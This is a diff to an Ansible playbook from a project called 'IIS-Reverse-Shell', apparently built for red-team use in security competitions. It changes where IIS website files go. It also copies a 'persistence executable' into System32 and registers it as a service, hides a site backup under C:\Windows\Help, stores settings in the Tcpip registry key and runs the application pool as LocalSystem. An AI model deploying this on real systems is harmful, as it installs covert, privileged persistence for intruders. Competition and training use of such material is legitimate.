@@ -29,73 +29,64 @@
       win_file:
         path: "C:\\vc_redist.x64.exe"
         state: absent
-
-    - name: Removes the Default IIS Website
-      win_iis_website:
-        name: "Default Web Site"
-        state: absent
-        
-    - name: Removes Default Application Pool
-      win_iis_webapppool:
-        name: "DefaultAppPool"
-        state: absent
-
-    - name: Creates IIS Web Root Directory
-      win_file:
-        path: "C:\\inetpub\\{{ Competition }}"
-        state: directory
-
-    - name: Creates a New IIS Website
-      win_iis_website:
-        name: "{{ Competition }}"
-        state: started
-        physical_path: "C:\\inetpub\\{{ Competition }}"
-        port: 80
-        ip: "*"
         
     - name: Deploys Website Images
       win_copy:
         src: "~/IIS-Reverse-Shell/Images/{{ Competition }}/"
-        dest: "C:\\inetpub\\{{ Competition }}\\Images"
+        dest: "C:\\inetpub\\wwwroot\\Images"
         
     - name: Deploys index.html
       win_copy:
         src: "~/IIS-Reverse-Shell/Website/{{ Competition }}.html"
-        dest: "C:\\inetpub\\{{ Competition }}"
+        dest: "C:\\inetpub\\wwwroot"
         
     - name: Deploys web.config
       win_copy:
         src: "~/IIS-Reverse-Shell/Website/web.config"
-        dest: "C:\\inetpub\\{{ Competition }}"
+        dest: "C:\\inetpub\\wwwroot"
         
     - name: Deploys button.js
       win_copy:
         src: "~/IIS-Reverse-Shell/Website/button.js"
-        dest: "C:\\inetpub\\{{ Competition }}"
+        dest: "C:\\inetpub\\wwwroot"
     
     - name: Deploys search.php
       win_copy:
         src: "~/IIS-Reverse-Shell/PHP/search.php"
-        dest: "C:\\inetpub\\{{ Competition }}\\search.php"
+        dest: "C:\\inetpub\\wwwroot\\search.php"
 
     - name: Deploys contact.php
       win_copy:
         src: "~/IIS-Reverse-Shell/PHP/contact.php"
-        dest: "C:\\inetpub\\{{ Competition }}\\contact.php"
+        dest: "C:\\inetpub\\wwwroot\\contact.php"
         
     - name: Backup Website Contents
-      win_shell: Copy-Item -Path "C:\inetpub\{{ Competition }}" -Destination "C:\Windows\Help\Help" -Recurse -Force
+      win_shell: Copy-Item -Path "C:\inetpub\wwwroot" -Destination "C:\Windows\Help\Help" -Recurse -Force
       
     - name: Deploys Persistence Executable
       win_copy:
         src: "~/IIS-Reverse-Shell/Persistence/webmgr.exe"
         dest: "C:\\Windows\\System32"
      
-    - name: Creates Competition Variable Registry Key
+    - name: Creates IIS_Folder_Name Variable Registry Key
       win_regedit:
       	path: HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip
-      	name: Competition
-      	data: "{{ Competition }}"
+      	name: IIS_Folder_Name
+      	data: "{{ IIS_Folder_Name }}"
+      	type: string
+
+    - name: Creates IIS_Site_Name Variable Registry Key
+      win_regedit:
+      	path: HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip
+      	name: IIS_Site_Name
+      	data: "{{ IIS_Site_Name }}"
+      	type: string
+
+    - name: Creates IIS_AppPool Variable Registry Key
+      win_regedit:
+      	path: HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip
+      	name: IIS_AppPool
+      	data: "{{ IIS_AppPool }}"
       	type: string
       	
     - name: Adds Executable to Services
@@ -165,17 +156,10 @@
       
     - name: Set Application Pool to LocalSystem
       win_iis_webapppool:
-        name: "{{ Competition }}"
+        name: DefaultAppPool
         state: started
         attributes:
           processModel.identityType: LocalSystem
-          
-    - name: Assign Application Pool to Website
-      win_iis_website:
-        name: "{{ Competition }}"
-        application_pool: "{{ Competition }}"
-        state: started
-        physical_path: "C:\\inetpub\\{{ Competition }}"
 
     - name: Restarts IIS
       win_shell: iisreset /restart
